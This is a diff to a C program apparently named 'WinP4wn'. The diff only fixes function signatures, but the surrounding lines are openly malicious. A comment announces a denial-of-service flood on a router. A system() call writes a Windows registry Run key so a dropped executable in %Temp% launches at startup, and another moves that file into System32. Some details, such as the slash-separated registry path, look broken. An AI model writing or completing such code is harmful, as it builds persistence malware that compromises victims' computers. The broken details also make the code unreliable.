@@ -3,7 +3,7 @@
 #include <string.h>
 #include <time.h>
 
-void getos(int argc, char** argv[]) {
+void getos() {
 #ifndef __WIN32__
 #define OS __WIN32__
   /** do a DOS Flood on the NSA Router */
@@ -22,16 +22,16 @@ void getos(int argc, char** argv[]) {
 #endif
 }
 
-void autorun(int argc, char** argv[]) {
+void autorun() {
   /** mounting WinP4wn as autorun driver */
   system("reg add Computer/HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run/WinP4wned /v GetP4wned /t REG_EXPAND_SZ /d %Temp%/WinP4wn/27cacc006aaf5bdd2a8e6b9b94711548.exe");
 }
 
-void aftereffect(int argc, char** argv[]) {
+void aftereffect() {
   system("move %Temp%/winp4wn/27cacc006aaf5bdd2a8e6b9b94711548.exe C:/Windows/System32");
 }
 
-int main(int argc, char** argv[]) {
+int main(int argc, char* argv[]) {
   getos();
   autorun();
   aftereffect();
